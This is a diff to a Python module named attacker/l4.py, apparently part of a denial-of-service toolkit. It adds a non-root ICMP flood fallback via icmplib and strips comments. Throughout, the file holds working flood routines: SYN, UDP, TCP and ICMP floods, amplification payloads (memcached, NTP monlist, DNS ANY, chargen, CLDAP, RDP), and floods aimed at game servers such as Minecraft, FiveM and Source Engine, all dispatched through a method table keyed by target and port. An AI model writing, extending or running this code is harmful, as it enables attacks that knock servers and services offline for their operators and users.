@@ -1,6 +1,19 @@
 # attacker/l4.py — L3/L4 flood + amplification (raw sockets, root required)
+# ใช้ icmplib fallback สำหรับ ICMP ตอนรันแบบ non-root
 import socket, struct, random, time, threading, os, asyncio
 from config import MAX_TIME
+
+try:
+    from icmplib import ping
+    _HAS_ICMPLIB = True
+except ImportError:
+    _HAS_ICMPLIB = False
+
+def _is_root():
+    try:
+        return os.geteuid() == 0
+    except AttributeError:
+        return False
 
 def _rand_ip():
     return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
@@ -97,6 +110,25 @@ def _flood_tcp_conn(target, port, until):
         except Exception:
             pass
 
+# ---- ICMP dual-mode: raw ถ้า root / icmplib ถ้าไม่ ----
+
+def _icmp_root(target, port, until):
+    _flood_raw(target, port, until, lambda s, d, p: _icmp(s, d))
+
+def _icmp_noroot(target, port, until):
+    if not _HAS_ICMPLIB:
+        raise RuntimeError("icmplib not installed and not running as root")
+    while time.time() < until:
+        try:
+            ping(target, count=1, interval=0.0, timeout=0.2, privileged=False)
+        except Exception:
+            pass
+
+def _icmp_auto(target, port, until):
+    if _is_root():
+        return _icmp_root(target, port, until)
+    return _icmp_noroot(target, port, until)
+
 # ---- amplification payloads ----
 
 def _memcached(target, port, until):
@@ -109,7 +141,6 @@ def _memcached(target, port, until):
             pass
 
 def _ntp(target, port, until):
-    # monlist request
     pkt = b"\x17\x00\x03\x2a" + b"\x00" * 44
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < until:
@@ -119,15 +150,12 @@ def _ntp(target, port, until):
             pass
 
 def _dns(target, port, until):
-    # ANY query with EDNS0 — minimal raw query built from domain
     def q(domain):
         tid = random.randint(0, 65535)
         flags = 0x0100
         hdr = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 1)
-        # QNAME
         qname = b"".join(bytes([len(p)]) + p.encode() for p in domain.split(".")) + b"\x00"
-        qst = qname + struct.pack("!HH", 255, 1)  # ANY, IN
-        # OPT record
+        qst = qname + struct.pack("!HH", 255, 1)
         opt = b"\x00" + struct.pack("!HHIH", 41, 4096, 0, 0)
         return hdr + qst + opt
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -146,7 +174,6 @@ def _chargen(target, port, until):
             pass
 
 def _cldap(target, port, until):
-    # LDAP searchRequest over UDP
     pkt = bytes.fromhex("300c020101600702010304008000")
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < until:
@@ -157,7 +184,7 @@ def _cldap(target, port, until):
 
 def _ard(target, port, until):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    pkt = b"\x00" * 36  # VNC auth attempt stub
+    pkt = b"\x00" * 36
     while time.time() < until:
         try:
             s.sendto(pkt, (target, port))
@@ -165,7 +192,6 @@ def _ard(target, port, until):
             pass
 
 def _rdp(target, port, until):
-    # RDP connection request (X.224 CR)
     pkt = bytes.fromhex("030000132ee00000000000010008000b000000")
     while time.time() < until:
         try:
@@ -177,29 +203,24 @@ def _rdp(target, port, until):
         except Exception:
             pass
 
-# ---- games / protocols ----
+# ---- game protocols ----
 
 def _vse(target, port, until):
-    # Valve Source Engine A2S_INFO query
     pkt = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
     _flood_udp_plain(target, port, until, pkt)
 
 def _ts3(target, port, until):
-    # teamspeak 3 status ping
     pkt = b"\x00\x00\x00\x00\x00\x00\x00\x00"
     _flood_udp_plain(target, port, until, pkt)
 
 def _minecraft(target, port, until):
-    # mc status handshake — TCP
     while time.time() < until:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((target, port))
-            # handshake packet
             host = target.encode()
             hs = b"\x00" + b"\x00" + b"\x00" + struct.pack(">b", len(host)) + host + struct.pack(">H", port) + b"\x01"
-            # varint length
             s.send(bytes([len(hs)]) + hs)
             s.send(b"\x01\x00")
             s.close()
@@ -210,14 +231,12 @@ def _mcbot(target, port, until):
     _minecraft(target, port, until)
 
 def _mcpe(target, port, until):
-    # RakNet unconnected ping
     ts = int(time.time())
     guid = random.randint(0, 0xFFFFFFFFFFFFFFFF)
     pkt = b"\x01" + struct.pack(">Q", ts) + b"\x00" * 8 + struct.pack(">Q", guid)
     _flood_udp_plain(target, port, until, pkt)
 
 def _fivem(target, port, until):
-    # FiveM getinfo query
     pkt = b"\xFF\xFF\xFF\xFFgetinfo xxx"
     _flood_udp_plain(target, port, until, pkt)
 
@@ -226,7 +245,6 @@ def _fivem_token(target, port, until):
     _flood_udp_plain(target, port, until, pkt)
 
 def _ovh_udp(target, port, until):
-    # random binary payload with forged headers
     _flood_udp_plain(target, port, until, os.urandom(random.randint(200, 800)))
 
 def _cps(target, port, until):
@@ -236,35 +254,34 @@ def _connection(target, port, until):
     _flood_tcp_conn(target, port, until)
 
 def _tcp(target, port, until):
-    _flood_raw(target, port, until, lambda s,d,p: _udp(s,d,p))  # fallback simplest raw
+    _flood_raw(target, port, until, lambda s, d, p: _udp(s, d, p))
 
 METHODS = {
-    "SYN":       lambda t,p,u: _flood_raw(t, p, u, _syn),
-    "UDP":       lambda t,p,u: _flood_udp_plain(t, p, u),
-    "TCP":       lambda t,p,u: _flood_tcp_conn(t, p, u),
-    "ICMP":      lambda t,p,u: _flood_raw(t, p, u, lambda s,d,po: _icmp(s,d)),
-    "OVH-UDP":   _ovh_udp,
-    "CPS":       _cps,
-    "CONNECTION":_connection,
-    "VSE":       _vse,
-    "TS3":       _ts3,
-    "FIVEM":     _fivem,
-    "FIVEM-TOKEN": _fivem_token,
-    "MEM":       _memcached,
-    "NTP":       _ntp,
-    "DNS":       _dns,
-    "CHAR":      _chargen,
-    "CLDAP":     _cldap,
-    "ARD":       _ard,
-    "RDP":       _rdp,
-    "MINECRAFT": _minecraft,
-    "MCBOT":     _mcbot,
-    "MCPE":      _mcpe,
+    "SYN":        lambda t,p,u: _flood_raw(t, p, u, _syn),
+    "UDP":        lambda t,p,u: _flood_udp_plain(t, p, u),
+    "TCP":        lambda t,p,u: _flood_tcp_conn(t, p, u),
+    "ICMP":       _icmp_auto,
+    "OVH-UDP":    _ovh_udp,
+    "CPS":        _cps,
+    "CONNECTION": _connection,
+    "VSE":        _vse,
+    "TS3":        _ts3,
+    "FIVEM":      _fivem,
+    "FIVEM-TOKEN":_fivem_token,
+    "MEM":        _memcached,
+    "NTP":        _ntp,
+    "DNS":        _dns,
+    "CHAR":       _chargen,
+    "CLDAP":      _cldap,
+    "ARD":        _ard,
+    "RDP":        _rdp,
+    "MINECRAFT":  _minecraft,
+    "MCBOT":      _mcbot,
+    "MCPE":       _mcpe,
 }
 
 async def run(method, target, port, until):
     fn = METHODS.get(method.upper())
     if not fn:
         raise ValueError(f"unknown L4 method: {method}")
-    # run in thread pool — raw socket loops are blocking
     await asyncio.get_event_loop().run_in_executor(None, lambda: fn(target, port, until))
